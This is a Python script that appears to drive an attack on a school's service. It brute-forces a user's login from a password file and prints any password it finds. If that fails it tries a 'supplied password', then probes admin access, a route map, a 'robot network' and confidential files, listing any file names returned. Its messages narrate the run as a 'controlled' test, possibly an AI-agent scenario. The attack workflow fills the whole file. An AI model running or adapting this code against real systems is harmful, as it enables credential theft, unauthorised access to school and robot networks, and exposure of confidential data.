import sys

import requests

from network_scanner import discover_target
from password_attack import find_password
from route_discovery import discover_routes, use_supplied_routes
from settings import load_settings


def _json(response: requests.Response) -> dict:
    try:
        payload = response.json()
    except ValueError:
        return {}
    return payload if isinstance(payload, dict) else {}


def _get(
    session: requests.Session,
    url: str,
    timeout: float,
) -> requests.Response | None:
    try:
        return session.get(url, timeout=timeout)
    except requests.RequestException as error:
        print(f"request failed for {url}: {error}, continuing the tests", flush=True)
        return None


def _try_supplied_password(
    session: requests.Session,
    base_url: str,
    login_path: str,
    username: str,
    supplied_password: str | None,
    timeout: float,
) -> bool:
    if not supplied_password:
        print(
            "no supplied password is configured, continuing without "
            "authenticated access",
            flush=True,
        )
        return False

    print(
        "I cannot access the service through brute force, I am using the "
        "supplied password to continue this test",
        flush=True,
    )
    try:
        response = session.post(
            f"{base_url}{login_path}",
            json={"username": username, "password": supplied_password},
            timeout=timeout,
        )
    except requests.RequestException as error:
        print(f"supplied-password request failed: {error}, continuing the tests")
        return False

    if response.status_code == 429:
        print(
            "the network rejected the supplied password because too many "
            "requests were sent, continuing the tests",
            flush=True,
        )
        return False

    if response.ok and _json(response).get("decision") == "ALLOW":
        print("supplied password accepted, continuing the tests", flush=True)
        return True

    print(
        f"supplied password rejected ({response.status_code}), "
        "continuing the tests",
        flush=True,
    )
    return False


def main() -> int:
    settings = load_settings()
    target = discover_target(settings)
    if target is None:
        print(
            "no reachable school service was found, the test run is complete",
            flush=True,
        )
        return 0

    routes = discover_routes(target.routes)
    if routes is None:
        print(
            "route inventory is not exposed, using supplied test paths "
            "for this controlled run",
            flush=True,
        )
        routes = use_supplied_routes(settings.supplied_routes)
    if routes is None:
        print(
            "supplied test paths are missing, continuing without endpoint "
            "checks",
            flush=True,
        )
        return 0

    if target.routes:
        print(f"discovered {len(target.routes)} school routes", flush=True)

    with requests.Session() as session:
        result = find_password(
            session=session,
            base_url=target.base_url,
            login_path=routes.login,
            username=settings.target_username,
            password_file=settings.password_file,
            timeout=settings.request_timeout,
        )

        if result.password:
            print(
                f"password found for user {settings.target_username}: "
                f"{result.password}",
                flush=True,
            )
        else:
            print("brute-force login was not successful", flush=True)
            _try_supplied_password(
                session=session,
                base_url=target.base_url,
                login_path=routes.login,
                username=settings.target_username,
                supplied_password=settings.supplied_password,
                timeout=settings.request_timeout,
            )

        print("checking permissions", flush=True)
        admin_response = _get(
            session,
            f"{target.base_url}{routes.admin}",
            settings.request_timeout,
        )
        if admin_response is not None:
            admin_payload = _json(admin_response)
            if admin_response.ok and admin_payload.get("role") == "admin":
                print("admin user has admin access", flush=True)
            else:
                print(
                    f"admin access denied ({admin_response.status_code}), "
                    "continuing the tests",
                    flush=True,
                )

        school_response = _get(
            session,
            f"{target.base_url}{routes.school_map}",
            settings.request_timeout,
        )
        if school_response is not None and school_response.ok:
            print("school route map discovered", flush=True)
        else:
            status = (
                school_response.status_code
                if school_response is not None
                else "unreachable"
            )
            print(f"school route map unavailable ({status}), continuing the tests")

        print("trying to access the robot network", flush=True)
        robot_response = _get(
            session,
            f"{target.base_url}{routes.robot_network}",
            settings.request_timeout,
        )
        if robot_response is not None and robot_response.ok:
            print("robot network access granted", flush=True)
        else:
            status = (
                robot_response.status_code
                if robot_response is not None
                else "unreachable"
            )
            print(f"robot network access denied ({status}) continuing the tests")

        print("trying to access confidential files", flush=True)
        files_response = _get(
            session,
            f"{target.base_url}{routes.confidential_files}",
            settings.request_timeout,
        )
        if files_response is not None and files_response.ok:
            print("access to confidential files granted", flush=True)
            for filename in _json(files_response).get("files", []):
                print(f"- {filename}", flush=True)
        else:
            status = (
                files_response.status_code
                if files_response is not None
                else "unreachable"
            )
            print(
                f"access to confidential files denied ({status}), "
                "continuing the tests",
                flush=True,
            )

    return 0


if __name__ == "__main__":
    sys.exit(main())
